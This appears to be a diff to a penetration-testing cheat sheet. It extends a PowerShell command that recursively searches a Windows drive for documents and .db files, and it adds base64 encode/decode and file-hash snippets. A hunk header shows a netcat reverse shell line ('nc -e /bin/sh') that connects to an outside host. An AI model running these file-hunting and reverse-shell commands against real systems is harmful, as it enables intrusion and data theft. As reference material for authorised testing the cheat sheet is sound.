@@ -72,10 +72,10 @@ find . -type f -print0 | xargs -0 chmod 0644
 
 
 
-File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx`
+File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx, *.db`
 ```powershell
 # PS example
-Get-ChildItem -Path C:\ -Include *.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx -Recurse -ErrorAction SilentlyContinue -Force
+Get-ChildItem -Path C:\ -Include *.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx, *.db -Recurse -ErrorAction SilentlyContinue -Force -Exclude desktop.ini
 # Will likely net a lot of .ini files.  Be very careful
 ```
 
@@ -187,6 +187,21 @@ nc -e /bin/sh 10.0.0.1 1234
 
 
 #### PowerShell
+
+##### Encode base64
+```powershell
+[Convert]::ToBase64String((Get-Content -path "<File to Encode>" -Encoding byte))
+```
+
+##### Decode base64
+```powershell
+[IO.File]::WriteAllBytes("<save path>", [Convert]::FromBase64String("<base64 string>"))
+```
+
+#### Confirm file hash
+```powershell
+Get-FileHash C:\Users\Public\<file> -Algorithm md5
+```
 
 ##### Find account lockout policy
 ```powershell
